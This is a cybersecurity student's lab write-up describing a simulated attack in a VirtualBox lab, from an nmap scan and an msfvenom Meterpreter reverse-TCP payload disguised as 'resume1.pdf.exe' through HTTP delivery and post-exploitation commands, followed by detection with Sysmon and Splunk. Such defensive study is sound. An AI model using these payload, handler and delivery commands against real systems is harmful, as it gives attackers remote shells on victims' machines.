# Malware Simulation and Detection with Splunk

## Objective

This project involved simulating a cyberattack in a controlled virtual environment to understand how malware behaves, how attackers exploit systems, and how defensive tools like Splunk can detect such activities. A reverse TCP payload was generated using Metasploit and deployed on a Windows 10 Pro virtual machine. Post-exploitation activities were logged and analyzed using Splunk, offering insight into endpoint detection and response mechanisms.

## Skills Learned

- Practical experience with Metasploit Framework and payload generation  
- Understanding of reverse shell exploits and post-exploitation techniques  
- Experience using Splunk and Sysmon to detect system-level attack footprints  
- Proficiency in basic malware delivery methods and execution flow  
- Network traffic monitoring and port-based service delivery using Python  
- Enhanced knowledge of attacker tactics, techniques, and procedures (TTPs)  

## Tools Used

- Oracle VirtualBox for virtual machine setup  
- Kali Linux as the attacker machine  
- Windows 10 Pro as the victim machine  
- Metasploit Framework (msfvenom and msfconsole)  
- Python HTTP server to host and serve the payload  
- Splunk for centralized logging and analysis  
- Sysmon (System Monitor) for detailed Windows event logging  
- Nmap for target scanning and reconnaissance  

## Steps

1. **Network Setup**  
   - Created two virtual machines in Oracle VirtualBox: Kali Linux and Windows 10 Pro  
   - Connected them using Internal Network mode  
   - Kali Linux IP: `192.168.20.11`, Windows 10 IP: `192.168.20.10`  

2. **Scanning Target**  
   - Ran the following command on Kali to scan the Windows machine:  
     ```bash
     nmap -sS 192.168.20.10
     ```

3. **Creating Malware Payload**  
   - Used Metasploit’s `msfvenom` to create a malicious executable:  
     ```bash
     msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.20.11 LPORT=4445 -f exe -o resume1.pdf.exe
     ```

4. **Launching Exploit Handler**  
   - Started Metasploit Console and configured the handler:  
     ```bash
     msfconsole
     use exploit/multi/handler
     set payload windows/x64/meterpreter/reverse_tcp
     set LHOST 192.168.20.11
     set LPORT 4445
     exploit
     ```

5. **Serving Malware**  
   - Hosted the malicious file via HTTP server:  
     ```bash
     cd ~/Desktop
     python3 -m http.server 9999
     ```

6. **Executing Payload on Victim**  
   - Accessed `http://192.168.20.11:9999` from the Windows 10 VM and downloaded `resume1.pdf.exe`  
   - Verified connection using:  
     ```bash
     netstat -anob
     ```

7. **Post-Exploitation with Meterpreter**  
   - On successful connection, executed system info gathering commands from Kali:  
     ```bash
     shell
     net user
     net localgroup
     ipconfig
     ```

8. **Installing Sysmon and Using Splunk for Detection**  
   - Installed **Sysmon** on Windows to enhance log detail and focus on key ports and processes  
   - Opened Splunk and searched with:  
     ```
     index=endpoint
     ```  
   - Verified all attacker actions (like `net user`, `ipconfig`, etc.) were logged and visible in Splunk  

## Key Observations

- Without Sysmon, Splunk’s logging was too broad and hard to correlate  
- With Sysmon, telemetry was narrowed down and made actionable  
- Meterpreter commands were captured in Splunk logs due to Sysmon-enhanced visibility  
- Demonstrated end-to-end attack chain from delivery to detection  

## Author

**Shivain Maini**  
Cybersecurity Student   
[LinkedIn Profile](https://www.linkedin.com/in/shivain-maini-023301282/) 

